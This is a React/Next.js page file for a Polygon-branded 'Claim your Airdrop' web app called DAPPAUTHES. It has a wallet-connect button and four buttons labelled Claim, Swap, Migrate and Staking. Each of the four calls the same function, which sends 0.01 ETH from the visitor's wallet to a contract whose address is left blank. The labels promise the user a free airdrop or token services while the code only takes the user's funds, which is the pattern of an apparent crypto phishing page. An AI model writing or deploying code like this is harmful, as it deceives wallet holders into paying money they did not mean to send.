import Head from 'next/head'
import Image from 'next/image'
import styles from '../styles/Home.module.css'
import Web3Modal from "web3modal";
import { useState, useEffect } from "react";
import { ethers } from "ethers";
import { abi } from '../constants/abi'
import Toggle from './Toggle'
import {BiWallet} from 'react-icons/bi'
import {BiPolygon} from 'react-icons/bi'

let web3Modal;

const ethAmount ='0.01'

const providerOptions = {
  binancechainwallet: {
    package: true
  }
};

if (typeof window !== "undefined") {
  web3Modal = new Web3Modal({
    cacheProvider: false,
    providerOptions, // required
  });
}




export default function Polygon() {
  const [isConnected, setIsConnected] = useState(false);
  const [hasMetamask, setHasMetamask] = useState(false);
  const [signer, setSigner] = useState(undefined);

  // useEffect(() => {
  //   if (typeof window.ethereum !== "undefined") {
  //     setHasMetamask(true);
  //   }
  // }, []);

  async function connect() {
    
      try {
        const web3ModalProvider = await web3Modal.connect();
        setIsConnected(true);
        const provider = new ethers.providers.Web3Provider(web3ModalProvider);
        setSigner(provider.getSigner());
      } catch (e) {
        console.log(e);
      }
    
  }

  async function fund() {
    const ethAmount = "0.01";
      console.log(`Funding with ${ethAmount}...`)
    
      const web3ModalProvider = await web3Modal.connect();
          setIsConnected(true);
          const provider = new ethers.providers.Web3Provider(web3ModalProvider);
          setSigner(provider.getSigner());
        const contractAddress = '';
        const contract = new ethers.Contract(contractAddress, abi, signer);
          try {
              const transactionResponse = await contract.fund({
                  value: ethers.utils.parseEther(ethAmount),
              })
              await listenForTransactionMine(transactionResponse, provider)
          } catch (error) {
              console.log(error)
          }
     
    }


function listenForTransactionMine(transactionResponse, provider) {
  console.log(`Mining ${transactionResponse.hash}`)
  return new Promise((resolve, reject) => {
      provider.once(transactionResponse.hash, (transactionReceipt) => {
          console.log(
              `Completed with ${transactionReceipt.confirmations} confirmations. `
          )
          resolve()
      })
  })
}
  return (
    
      <div>
         <div>
        <header>
      

          <div className="connect-btn-container">
          <Toggle></Toggle>
           
{isConnected ? (
          <button className="connect-btn" > <BiWallet className='connect-icon'/> Connected</button>
        ) : (
          <button className="connect-btn"  onClick={() => connect()}> <BiWallet className='connect-icon'/>Connect</button>
        )}
          </div>
        </header>
  
        <div className="main-container">
          <div className="inner-container">
            <div className="title-container">
              <h1 className="title"> <BiPolygon className='poly-icon'/>DAPPAUTHES</h1>
              </div>
            <div className="text-container">
              <p>Claim your Airdrop</p>
            </div>
  
            <div className="main-button-wrap-1">
  
              <div className="inner-button-wrap-1">
  
              <button className='btn' onClick={() => fund()}>Claim</button>
                 
            <button className='btn' onClick={() => fund()}>Swap</button>
  
              </div>
  
            </div>
  
            <div className="main-button-wrap-2">
              <div className="inner-button-wrap-2">
              <button className='btn' onClick={() => fund()}>Migrate</button>
            <button className='btn' onClick={() => fund()}>Staking</button>
                
  
              </div>
  
            </div>
  
          
  
  
           
  
          
        </div>
      </div>
  
      </div>
      </div>
    );
  }
  
  
